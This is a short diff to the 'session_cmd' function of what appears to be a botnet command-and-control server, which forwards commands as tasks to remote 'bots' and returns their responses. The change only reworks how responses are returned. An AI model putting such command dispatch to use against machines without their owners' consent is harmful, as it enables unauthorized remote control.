@@ -67,12 +67,15 @@ def session_cmd():
 		task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
 
 		# send task and get response
-		response = session_thread.send_task(task)
+		response,_ = session_thread.send_task(task)
 		# response = session_thread.recv_task()
 
 		# update task record with result in database
-		result = task_dao.handle_task(response)
-		return str(result['result']).encode()
+		# result = task_dao.handle_task(response)
+  
+		return response
+
+		# return str(result['result']).encode()
 
 	else:
 		return "Bot " + str(session_uid) + " is offline or does not exist."
